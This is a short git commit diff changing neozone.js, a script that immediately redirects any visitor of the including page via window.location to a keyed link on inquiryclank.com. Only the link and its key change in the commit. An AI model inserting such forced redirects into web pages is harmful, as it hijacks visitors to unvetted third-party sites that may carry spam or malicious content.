2dc3a88e0fb352f45d1972890b74d1992ba33ba1
Lara Johns <80411308+jarollellhel@users.noreply.github.com>
2021-07-06 14:36:14 +0800

    Update neozone.js

--- neozone.js
+++ neozone.js
@@ -1,6 +1,6 @@
 var dataUrl = [
 
-  'https://inquiryclank.com/z5u26gw0i?key=afd8bed48a5de3937c8422b84862a994'
+  'https://inquiryclank.com/sgnfjfg1?key=cafae42abf7afad6a696828e19405747'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
